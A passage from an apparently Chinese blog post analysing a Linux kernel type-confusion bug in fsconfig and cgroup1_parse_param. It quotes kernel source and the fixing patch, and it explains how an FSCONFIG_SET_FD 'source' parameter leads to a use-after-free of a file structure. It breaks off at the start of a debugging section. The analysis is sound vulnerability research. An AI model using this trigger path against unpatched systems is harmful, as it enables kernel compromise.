的成因。</p><h3>fsconfig</h3><p>这个系统调用太大了，只介绍它原有的含义和触发漏洞的位置。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">SYSCALL_DEFINE5(fsconfig,<br />                <span style="color: rgb(255, 255, 182);">int</span>, fd,<br />                unsigned <span style="color: rgb(255, 255, 182);">int</span>, cmd,<br />                <span style="color: rgb(150, 203, 254);">const</span> char __user *, _key,<br />                <span style="color: rgb(150, 203, 254);">const</span> void __user *, _value,<br />                <span style="color: rgb(255, 255, 182);">int</span>, aux)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> fs_context *fc;<br />    <span style="color: rgb(150, 203, 254);">struct</span> fd f;<br />    <span style="color: rgb(255, 255, 182);">int</span> ret;<br />    <span style="color: rgb(255, 255, 182);">int</span> lookup_flags = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> fs_parameter param = {<br />        .<span style="color: rgb(150, 203, 254);">type</span>        = fs_value_is_undefined,<br />    };<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br /><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FLAG:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || _value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || aux &lt;= <span style="color: rgb(255, 115, 253);">0</span> || aux &gt; <span style="color: rgb(255, 115, 253);">1024</span> * <span style="color: rgb(255, 115, 253);">1024</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span style="color: rgb(255, 115, 253);">0</span>))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || _value || aux &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_CMD_CREATE:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_CMD_RECONFIGURE:<br />            <span style="color: rgb(150, 203, 254);">if</span> (_key || _value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">return</span> -EOPNOTSUPP;<br />    }<br /><br />    f = fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!f.file)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EBADF;<br />    ret = -EINVAL;<br />    <span style="color: rgb(150, 203, 254);">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br />        <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br /><br />    fc = f.file-&gt;private_data;<br />    <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) {<br />        <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />                ret = -EOPNOTSUPP;<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (_key) {<br />        param.key = strndup_user(_key, <span style="color: rgb(255, 115, 253);">256</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.key)) {<br />            ret = PTR_ERR(param.key);<br />            <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FLAG:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_flag;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_string;<br />            param.<span style="color: rgb(255, 255, 182);">string</span> = strndup_user(_value, <span style="color: rgb(255, 115, 253);">256</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.<span style="color: rgb(255, 255, 182);">string</span>)) {<br />                ret = PTR_ERR(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            param.size = strlen(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_blob;<br />            param.size = aux;<br />            param.blob = memdup_user_nul(_value, aux);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.blob)) {<br />                ret = PTR_ERR(param.blob);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            lookup_flags = LOOKUP_EMPTY;<br />            <span style="color: rgb(150, 203, 254);">fallthrough</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_filename;<br />            param.name = getname_flags(_value, lookup_flags, NULL);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.name)) {<br />                ret = PTR_ERR(param.name);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            param.dirfd = aux;<br />            param.size = strlen(param.name-&gt;name);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_file;<br />            ret = -EBADF;<br />            param.file = fget(aux);<br />            <span style="color: rgb(150, 203, 254);">if</span> (!param.file)<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br /><br />    ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret == <span style="color: rgb(255, 115, 253);">0</span>) {<br />        ret = vfs_fsconfig_locked(fc, cmd, ¶m);<br />        mutex_unlock(&amp;fc-&gt;uapi_mutex);<br />    }<br /><br />    <span style="color: rgb(124, 124, 124);">/* Clean up the our record of any value that we obtained from<br />         * userspace.  Note that the value may have been stolen by the LSM or<br />         * filesystem, in which case the value pointer will have been cleared.<br />         */</span><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            kfree(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (param.name)<br />                putname(param.name);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            <span style="color: rgb(150, 203, 254);">if</span> (param.file)<br />                fput(param.file);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    out_key:<br />    kfree(param.key);<br />    out_f:<br />    fdput(f);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>这个系统调用允许挂载自己的文件系统而不用修改内核，它在调用的过程中存在类型混淆漏洞。</p><p>在选项 5 有个可以释放文件的操作 <code style="font-family: SFMono-Regular, Consolas, ;">FSCONFIG_SET_FD</code>，在解释参数的时候，会调用到下面的函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">int <span style="color: rgb(255, 255, 182);">vfs_parse_fs_param</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> *param)<br />{<br />        int ret;<br /><br />        <span style="color: rgb(255, 255, 182);">if</span> (!param-&gt;key)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"Unnamed parameter\n"</span>);<br /><br />        ret = <span style="color: rgb(255, 255, 182);">vfs_parse_sb_flag</span>(fc, param-&gt;key);<br />        <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        ret = <span style="color: rgb(255, 255, 182);">security_fs_context_parse_param</span>(fc, param);<br />        <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                <span style="color: rgb(124, 124, 124);">/* Param belongs to the LSM or is disallowed by the LSM; so<br />                 * don't pass to the FS.<br />                 */</span><br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;ops-&gt;parse_param) {<br />                ret = fc-&gt;ops-&gt;<span style="color: rgb(255, 255, 182);">parse_param</span>(fc, param);<span style="color: rgb(124, 124, 124);">//这个地方调用了cgroup1_parse_param</span><br />                <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />        }<br /><br />        <span style="color: rgb(124, 124, 124);">/* If the filesystem doesn't take any arguments, give it the<br />         * default handling of source.<br />         */</span><br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                <span style="color: rgb(255, 255, 182);">if</span> (param-&gt;<span style="color: rgb(150, 203, 254);">type</span> != fs_value_is_string)<br />                        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"VFS: Non-string source"</span>);<br />                <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;source)<br />                        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"VFS: Multiple sources"</span>);<br />                fc-&gt;source = param-&gt;string;<br />                param-&gt;string = NULL;<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"%s: Unknown parameter '%s'"</span>,<br />                      fc-&gt;fs_type-&gt;name, param-&gt;key);<br />}<br /><br />int <span style="color: rgb(255, 255, 182);">cgroup1_parse_param</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> *param)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">cgroup_fs_context</span> *ctx = <span style="color: rgb(255, 255, 182);">cgroup_fc2context</span>(fc);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">cgroup_subsys</span> *ss;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parse_result</span> result;<br />    int opt, i;<br /><br />    opt = <span style="color: rgb(255, 255, 182);">fs_parse</span>(fc, cgroup1_fs_parameters, param, &amp;result);<br />    <span style="color: rgb(255, 255, 182);">if</span> (opt == -ENOPARAM) {<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />            <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;source)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />            fc-&gt;source = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />        <span style="color: rgb(255, 255, 182);">for_each_subsys</span>(ss, i) {<br />            <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))<br />                <span style="color: rgb(150, 203, 254);">continue</span>;<br />            <span style="color: rgb(255, 255, 182);">if</span> (!<span style="color: rgb(255, 255, 182);">cgroup_ssid_enabled</span>(i) || <span style="color: rgb(255, 255, 182);">cgroup1_ssid_disabled</span>(i))<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Disabled controller '%s'"</span>,<br />                               param-&gt;key);<br />            ctx-&gt;subsys_mask |= (<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; i);<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Unknown subsys name '%s'"</span>, param-&gt;key);<br />    }<br />    <span style="color: rgb(255, 255, 182);">if</span> (opt &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> opt;<br /><br />    <span style="color: rgb(255, 255, 182);">switch</span> (opt) {<br />        case Opt_none:<br />            <span style="color: rgb(124, 124, 124);">/* Explicitly have no subsystems */</span><br />            ctx-&gt;none = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_all:<br />            ctx-&gt;all_ss = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_noprefix:<br />            ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_clone_children:<br />            ctx-&gt;cpuset_clone_children = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_cpuset_v2_mode:<br />            ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_xattr:<br />            ctx-&gt;flags |= CGRP_ROOT_XATTR;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_release_agent:<br />            <span style="color: rgb(124, 124, 124);">/* Specifying two release agents is forbidden */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (ctx-&gt;release_agent)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"release_agent respecified"</span>);<br />            ctx-&gt;release_agent = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        case Opt_name:<br />            <span style="color: rgb(124, 124, 124);">/* blocked by boot param? */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (cgroup_no_v1_named)<br />                <span style="color: rgb(150, 203, 254);">return</span> -ENOENT;<br />            <span style="color: rgb(124, 124, 124);">/* Can't specify an empty name */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (!param-&gt;size)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Empty name"</span>);<br />            <span style="color: rgb(255, 255, 182);">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span style="color: rgb(255, 115, 253);">1</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Name too long"</span>);<br />            <span style="color: rgb(124, 124, 124);">/* Must match [\w.-]+ */</span><br />            <span style="color: rgb(255, 255, 182);">for</span> (i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; param-&gt;size; i++) {<br />                <span style="color: rgb(255, 255, 182);">char</span> c = param-&gt;string[i];<br />                <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">isalnum</span>(c))<br />                    <span style="color: rgb(150, 203, 254);">continue</span>;<br />                <span style="color: rgb(255, 255, 182);">if</span> ((c == <span style="color: rgb(168, 255, 96);">'.'</span>) || (c == <span style="color: rgb(168, 255, 96);">'-'</span>) || (c == <span style="color: rgb(168, 255, 96);">'_'</span>))<br />                    <span style="color: rgb(150, 203, 254);">continue</span>;<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"Invalid name"</span>);<br />            }<br />            <span style="color: rgb(124, 124, 124);">/* Specifying two names is forbidden */</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (ctx-&gt;name)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalfc</span>(fc, <span style="color: rgb(168, 255, 96);">"name respecified"</span>);<br />            ctx-&gt;name = param-&gt;string;<br />            param-&gt;string = NULL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>通过 <code style="font-family: SFMono-Regular, Consolas, ;">PATCH</code> 文件可以看出来（实则因为菜实在分析不来）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c<br />index ee93b6e895874..527917c0b30be 100644<br />--- a/kernel/cgroup/cgroup-v1.c<br />+++ b/kernel/cgroup/cgroup-v1.c<br />@@ -912,6 +912,8 @@ int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)<br />         opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br />         <span style="color: rgb(150, 203, 254);">if</span> (opt == -ENOPARAM) {<br />                 <span style="color: rgb(150, 203, 254);">if</span> (strcmp(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == 0) {<br />+                        <span style="color: rgb(150, 203, 254);">if</span> (param-&gt;type != fs_value_is_string)<br />+                                return invalf(fc, <span style="color: rgb(168, 255, 96);">"Non-string source"</span>);<br />                         <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;source)<br />                                 return invalf(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />                         fc-&gt;source = param-&gt;string;</code></pre><p>如果 <code style="font-family: SFMono-Regular, Consolas, ;">key</code> 为 <code style="font-family: SFMono-Regular, Consolas, ;">source</code>，那么 <code style="font-family: SFMono-Regular, Consolas, ;">param-&gt;type</code> 必须被指定为 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 类型而不能是文件描述符，此时因为外面的 <code style="font-family: SFMono-Regular, Consolas, ;">cmd=FSCONFIG_SET_FD</code>，因此获取了文件结构在联合体当中。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> {<br />    <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>                *key;                <span style="color: rgb(124, 124, 124);">/* Parameter name */</span><br />    <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">fs_value_type</span>        type:<span style="color: rgb(255, 115, 253);">8</span>;                <span style="color: rgb(124, 124, 124);">/* The type of value here */</span><br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(255, 255, 182);">char</span>                *string;<br />        <span style="color: rgb(255, 255, 182);">void</span>                *blob;<br />        <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">filename</span>        *name;<br />        <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span>        *file;<br />    };<br />    <span style="color: rgb(255, 255, 182);">size_t</span>        size;<br />    <span style="color: rgb(255, 255, 182);">int</span>        dirfd;<br />};</code></pre><p>在判断中可以看到这样一句：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (strcmp(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == 0) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;source)<br />        return invalf(fc, <span style="color: rgb(168, 255, 96);">"Multiple sources not supported"</span>);<br />    fc-&gt;source = param-&gt;string;<br />    param-&gt;string = NULL;<br />    return 0;<br />}</code></pre><p>此时将 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 保存在 <code style="font-family: SFMono-Regular, Consolas, ;">fc-&gt;source</code> 当中，因为它们共用内存，所以这里的 <code style="font-family: SFMono-Regular, Consolas, ;">string</code> 实际上是 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code> 结构体指针。</p><p>最后要 <code style="font-family: SFMono-Regular, Consolas, ;">free</code> 掉这个 <code style="font-family: SFMono-Regular, Consolas, ;">fs_context</code> 结构时，就意外地造成了这里的文件结构的 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code>，最后这个系统调用完成会触发 <code style="font-family: SFMono-Regular, Consolas, ;">fscontext_release</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">void <span style="color: rgb(255, 255, 182);">put_fs_context</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">super_block</span> *sb;<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;root) {<br />        sb = fc-&gt;root-&gt;d_sb;<br />        <span style="color: rgb(255, 255, 182);">dput</span>(fc-&gt;root);<br />        fc-&gt;root = NULL;<br />        <span style="color: rgb(255, 255, 182);">deactivate_super</span>(sb);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;free)<br />        fc-&gt;ops-&gt;<span style="color: rgb(255, 255, 182);">free</span>(fc);<br /><br />    <span style="color: rgb(255, 255, 182);">security_free_mnt_opts</span>(&amp;fc-&gt;security);<br />    <span style="color: rgb(255, 255, 182);">put_net</span>(fc-&gt;net_ns);<br />    <span style="color: rgb(255, 255, 182);">put_user_ns</span>(fc-&gt;user_ns);<br />    <span style="color: rgb(255, 255, 182);">put_cred</span>(fc-&gt;cred);<br />    <span style="color: rgb(255, 255, 182);">put_fc_log</span>(fc);<br />    <span style="color: rgb(255, 255, 182);">put_filesystem</span>(fc-&gt;fs_type);<br />    <span style="color: rgb(255, 255, 182);">kfree</span>(fc-&gt;source);<span style="color: rgb(124, 124, 124);">//这里意外地 free 掉了文件结构</span><br />    <span style="color: rgb(255, 255, 182);">kfree</span>(fc);<br />}<br /><span style="color: rgb(150, 203, 254);">static</span> int <span style="color: rgb(255, 255, 182);">fscontext_release</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *inode, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc = file-&gt;private_data;<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (fc) {<br />        file-&gt;private_data = NULL;<br />        <span style="color: rgb(255, 255, 182);">put_fs_context</span>(fc);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><h2>代码调试</h2><h3>触发UAF</h3><p>第一步打断点 <code style="font-family: SFMono-Regular, Consolas, ;">__do_sys_fsconfig</code>，然后跟到图示这个位置，可以发现获取到了文件结构了。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=deea24d0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKia3kia1AqibC0n941g0TxLbWwB8m29hBJbErm28IoVicoN7JpmRiaYAGabw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后跟到这个位置</p><p><img border="0" 